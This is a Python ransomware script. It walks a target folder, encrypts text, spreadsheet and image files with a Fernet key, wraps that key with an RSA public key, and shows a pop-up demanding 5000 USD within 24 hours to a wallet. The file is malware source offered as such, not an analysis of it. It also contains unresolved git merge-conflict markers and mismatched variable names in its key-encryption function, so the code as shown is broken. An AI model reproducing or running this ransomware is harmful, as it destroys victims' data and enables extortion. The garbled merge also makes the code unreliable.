from ctypes.wintypes import UINT
import os
import sys
import rsa
from cryptography.fernet import Fernet
import ctypes


MessageBox = ctypes.windll.user32.MessageBoxW if os.name == 'nt' else print

# File extensions to encrypt


def extensions(ext):
    return set(ext)


def find_files(files_location, encrypted_ext):
    file_paths = []
    for root, dirs, files in os.walk(files_location):
        for file in files:
            file_path, file_extension = os.path.splitext(root + '\\' + file)
            if file_extension in encrypted_ext:
                file_paths.append(root + os.path.sep + file)
    return file_paths


def load_key():
    with open('keys' + os.path.sep + 'pubkey.pem', 'rb') as f:
        pubKey = rsa.PublicKey.load_pkcs1(f.read())

    return pubKey


def generate_file_key():
    key = Fernet.generate_key()
    if os.path.exists('keys' + os.path.sep + 'files_key.key'):
        MessageBox(
            0, 'Your files are encrypted. Pay the ransom.\nWallet:\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX', 'ERROR', 1)
        sys.exit(1)
    else:
        with open('keys' + os.path.sep + 'files_key.key', 'wb') as f:
            f.write(key)
        return key


def encrypt_files(paths, key):
    for file_path in paths:
        with open(file_path, 'rb') as f:
            data = f.read()
            fernet = Fernet(key)
            encrypted = fernet.encrypt(data)
            with open(file_path, 'wb') as f:
                f.write(encrypted)


def encrypt_key(pubKey):


<< << << < HEAD
with open('keys' + os.path.sep + 'pubKey.pem', mode='rb'):
    f = open("keys" + os.path.sep + "files_key.key", mode='rb')
    fernet_key = f.read()
== == == =
with open('keys\\pubKey.pem', mode='rb'):
    f = open("keys\\files_key.key", mode='rb')
    files_key = f.read()
>>>>>> > 34d384ee242c71eef60cad996f4fbaa766e5e0e3
f.close()

encrypted_files_key = rsa.encrypt(files_key, pubKey)

<< << << < HEAD
f = open("keys" + os.path.sep + "files_key.key", 'wb')
f.write(bytearray(encrypted_fernet_key))
f.close()
== == == =
f = open("keys\\files_key.key", 'wb')
f.write(bytearray(encrypted_files_key))
f.close()

>>>>>> > 34d384ee242c71eef60cad996f4fbaa766e5e0e3


def main():

    encrypted_ext = extensions(('.txt', '.xlsx', '.jpg'))
    files_location = 'Atacar'
    paths = find_files(files_location, encrypted_ext)
    file_key = generate_file_key()
    encrypt_files(paths, file_key)
    rsa_key = load_key()
    encrypt_key(rsa_key)
    MessageBox(0, 'The files in your computer have been encrypted. \nIf you want to restore them, you must pay a ransom of 5000 USD  to the next Wallet in less than 24hs.\nYou can follow the steps in the following Link:\nhttps://www.westernunion.com/fr/en/mobile-wallet.html\nOnce the money is delivered, we will give you the information needed to recover your files.\nWallet:\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX', 'ALERT: YOU HAVE BEEN HACKED', 1)


if __name__ == "__main__":
    main()
